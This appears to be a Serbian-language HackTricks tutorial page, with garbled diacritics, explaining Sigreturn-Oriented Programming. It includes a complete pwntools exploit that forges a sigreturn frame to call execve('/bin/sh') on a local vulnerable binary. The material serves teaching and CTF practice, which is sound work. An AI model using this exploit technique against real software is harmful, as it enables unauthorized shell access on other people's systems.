# SROP - Sigreturn-Oriented Programming

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

**`Sigreturn`** je poseban **syscall** koji se uglavnom koristi za 캜i코캖enje nakon 코to je signalni rukovalac zavr코io svoje izvr코avanje. Signali su prekidi koje operativni sistem 코alje programu, 캜esto da bi ukazao da se desila neka izuzetna situacija. Kada program primi signal, privremeno pauzira svoj trenutni rad kako bi obradio signal pomo캖u **signalnog rukovaoca**, posebne funkcije dizajnirane za rukovanje signalima.

Nakon 코to signalni rukovalac zavr코i, program mora da **nastavi svoje prethodno stanje** kao da se ni코ta nije desilo. Tu dolazi do izra쬬ja **`sigreturn`**. Poma쬰 programu da **iza캠e iz signalnog rukovaoca** i vra캖a stanje programa 캜i코캖enjem okvira steka (sekcija memorije koja 캜uva pozive funkcija i lokalne promenljive) koji je kori코캖en od strane signalnog rukovaoca.

Interesantan deo je kako **`sigreturn`** vra캖a stanje programa: to radi tako 코to 캜uva **sve vrednosti registara CPU-a na steku.** Kada signal vi코e nije blokiran, **`sigreturn` izbacuje ove vrednosti sa steka**, efikasno resetuju캖i registre CPU-a na njihovo stanje pre rukovanja signalom. To uklju캜uje registar pokaziva캜a steka (RSP), koji pokazuje na trenutni vrh steka.

{% hint style="opasnost" %}
Pozivanjem syscall-a **`sigreturn`** iz ROP lanca i **dodavanjem vrednosti registara** koje 쬰limo da u캜ita u **stek** mogu캖e je **kontrolisati** sve vrednosti registara i stoga **pozvati** na primer syscall `execve` sa `/bin/sh`.
{% endhint %}

Primetite kako bi ovo bila **vrsta Ret2syscall** koja olak코ava kontrolisanje parametara za pozivanje drugih Ret2syscall-ova:

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

Za bolje obja코njenje pogledajte tako캠e:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## Primer

Mo쬰te [**prona캖i primer ovde**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop), iako je ovo kona캜an eksploit od tamo:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
## Reference

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
